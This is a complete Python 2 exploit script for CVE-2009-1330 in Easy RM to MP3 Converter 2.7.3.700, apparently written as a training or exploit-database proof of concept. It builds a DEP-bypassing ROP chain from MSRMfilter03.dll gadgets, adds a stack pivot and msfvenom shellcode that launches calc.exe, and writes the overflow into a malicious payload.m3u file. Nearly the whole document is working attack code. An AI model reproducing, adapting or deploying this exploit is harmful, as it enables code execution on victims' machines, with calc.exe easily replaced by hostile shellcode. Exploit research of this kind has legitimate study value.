#!/usr/bin/env python2

# Title: Easy RM to MP3 Converter 2.7.3.700
# Date: XX/XX/2023
# Exploit Author: NG
# Tested on: Windows 7 Professional Service Pack 1 x86
# CVE : CVE-2009-1330


import struct

# EAX = ptr to &VirtualProtect()
# ECX = lpOldProtect (ptr to W address)
# EDX = NewProtect (0x40)
# EBX = dwSize
# ESP = lPAddress (automatic)
# EBP = POP (skip 4 bytes)
# ESI = ptr to JMP [EAX]
# EDI = ROP NOP (RETN)
# pushad
# jmp esp

def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [

      #[---INFO:gadgets_to_set_esi:---]
      0x1002d61a,  # POP EAX # RETN [MSRMfilter03.dll] 
      0x10032078,  # ptr to &VirtualAlloc() [IAT MSRMfilter03.dll]
      0x1002e0c8,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [MSRMfilter03.dll] 
      0x1001a788,  # PUSH EAX # POP ESI # POP EBP # MOV EAX,1 # POP EBX # POP ECX # RETN [MSRMfilter03.dll] 
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)

     

      #[---INFO:gadgets_to_set_edx:---]
      0x1002d6cc,  # POP EDX # RETN    ** [MSRMfilter03.dll] **   
      0x11112112,
      0x10023725,  # POP EBX # POP ECX # RETN    ** [MSRMfilter03.dll] **
      0xeeeeeeee,
      0xcccccccc,
      0x10024ece,  # ADD EDX,EBX # POP EBX # RETN 0x10    ** [MSRMfilter03.dll] **  
      0x1001c121,  # RETN (ROP NOP) [MSRMfilter03.dll]
      0x1001c121,  # RETN (ROP NOP) [MSRMfilter03.dll]
      0x1001c121,  # RETN (ROP NOP) [MSRMfilter03.dll]
      0x1001c121,  # RETN (ROP NOP) [MSRMfilter03.dll]
      0x1001c121,  # RETN (ROP NOP) [MSRMfilter03.dll]
      0x1001c121,  # RETN (ROP NOP) [MSRMfilter03.dll]
      0x1001c121,  # RETN (ROP NOP) [MSRMfilter03.dll]

      #[---INFO:gadgets_to_set_ebx:---]
      0x1002a86b,  # POP EAX # RETN [MSRMfilter03.dll] 
      0xfffffffb,  # put delta into eax (-> put 0x00000001 into ebx)
      0x1001e880,  # ADD EAX,6 # ADD ESP,100 # RETN [MSRMfilter03.dll] 
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x1001bdee,  # PUSH EAX # MOV EAX,1 # POP EBX # ADD ESP,8 # RETN [MSRMfilter03.dll] 
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)

      #[---INFO:gadgets_to_set_ecx:---]
      0x10029555,  # POP ECX # RETN [MSRMfilter03.dll] 
      0xffffffff,  #  
      0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
      0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
      0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
      0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
      0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
      0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
      0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
      0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
      0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
      0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
      0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
      0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
      0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
      0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
      0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
      0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
      0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
      0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
      0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
      0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
      0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
      0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
      0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
      0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
      0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
      0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
      0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
      0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
      0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
      0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
      0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
      0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
      0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
      0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
      0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
      0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
      0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
      0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
      0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
      0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
      0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
      0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
      0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
      0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
      0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
      0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
      0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
      0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
      0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
      0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
      0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
      0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
      0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
      0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
      0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
      0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
      0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
      0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
      0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
      0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
      0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
      0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
      0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
      0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
      0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 

      #[---INFO:gadgets_to_set_edi:---]
      0x1002c051,  # POP EDI # RETN [MSRMfilter03.dll] 
      0x1001c121,  # RETN (ROP NOP) [MSRMfilter03.dll]

      #[---INFO:gadgets_to_set_eax:---]
      0x10025b72,  # POP EAX # RETN [MSRMfilter03.dll] 
      0x90909090,  # nop

#####################################
# PUSH AD trick
# ebp <- address of "add esp,8 + RETN"
# put PUSHAD + RETN address into eax (pop + add)
# PUSH eax+RETN
# PUSH ESP + RETN
####################################

      #[---INFO:gadgets_to_set_ebp:---] # Need to adjust esp for the trick below
      0x100280a2,   # POP EBP # RETN [MSRMfilter03.dll] 
      0x1001c21e,  # ADD ESP,8 # RETN    ** [MSRMfilter03.dll] **

      #[---INFO:pushad:---]
      #0x0042aee6,  # PUSHAD # RETN [RM2MP3Converter.exe] -> need to have it in eax and then push it
      0x10025b72,  # POP EAX # RETN [MSRMfilter03.dll] 
      0xa4e44fd6,  # value to be added to eax to reach pushad address
      0x1002df13,  # ADD EAX,5B5E5F10 # RETN    ** [MSRMfilter03.dll] ** 
      0x10013f25,  # PUSH EAX # RETN    ** [MSRMfilter03.dll] ** 
      0x1001c121,  # RETN (ROP NOP) [MSRMfilter03.dll]
      0x1001b058,  # PUSH ESP # RETN    ** [MSRMfilter03.dll] ** 

    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

offset=26079

# msfvenom -p windows/exec cmd=calc.exe -b "\x0a\x00\x0d\x1a" -f python -v shellcode
shellcode =  b""
shellcode += b"\xba\x53\xaf\x9e\xdb\xd9\xc2\xd9\x74\x24\xf4"
shellcode += b"\x5e\x33\xc9\xb1\x31\x31\x56\x13\x83\xee\xfc"
shellcode += b"\x03\x56\x5c\x4d\x6b\x27\x8a\x13\x94\xd8\x4a"
shellcode += b"\x74\x1c\x3d\x7b\xb4\x7a\x35\x2b\x04\x08\x1b"
shellcode += b"\xc7\xef\x5c\x88\x5c\x9d\x48\xbf\xd5\x28\xaf"
shellcode += b"\x8e\xe6\x01\x93\x91\x64\x58\xc0\x71\x55\x93"
shellcode += b"\x15\x73\x92\xce\xd4\x21\x4b\x84\x4b\xd6\xf8"
shellcode += b"\xd0\x57\x5d\xb2\xf5\xdf\x82\x02\xf7\xce\x14"
shellcode += b"\x19\xae\xd0\x97\xce\xda\x58\x80\x13\xe6\x13"
shellcode += b"\x3b\xe7\x9c\xa5\xed\x36\x5c\x09\xd0\xf7\xaf"
shellcode += b"\x53\x14\x3f\x50\x26\x6c\x3c\xed\x31\xab\x3f"
shellcode += b"\x29\xb7\x28\xe7\xba\x6f\x95\x16\x6e\xe9\x5e"
shellcode += b"\x14\xdb\x7d\x38\x38\xda\x52\x32\x44\x57\x55"
shellcode += b"\x95\xcd\x23\x72\x31\x96\xf0\x1b\x60\x72\x56"
shellcode += b"\x23\x72\xdd\x07\x81\xf8\xf3\x5c\xb8\xa2\x99"
shellcode += b"\xa3\x4e\xd9\xef\xa4\x50\xe2\x5f\xcd\x61\x69"
shellcode += b"\x30\x8a\x7d\xb8\x75\x64\x34\xe1\xdf\xed\x91"
shellcode += b"\x73\x62\x70\x22\xae\xa0\x8d\xa1\x5b\x58\x6a"
shellcode += b"\xb9\x29\x5d\x36\x7d\xc1\x2f\x27\xe8\xe5\x9c"
shellcode += b"\x48\x39\x86\x43\xdb\xa1\x67\xe6\x5b\x43\x78"


# Due to some stack corruption after the EIP redirection (offset)
# we have to do a bit of stack pivoting (24 bytes is enough)
# ROP chain must be 28 bytes after the offset

rop_chain = create_rop_chain()

# stack pivoting
add_esp = 0x10019297 # : {pivot 24 / 0x18} :  # ADD ESP,18 # RETN

buf = "A" * offset
buf += struct.pack('<I', add_esp)
buf += "\x90"*28		# stac_pivot of 24 bytes needs 28 bytes of filler
buf += rop_chain
buf += "\x90"*28		
buf += shellcode
buf += "B" * (1000-len(shellcode))




f = open("payload.m3u", "w")
f.write(buf)
f.close()
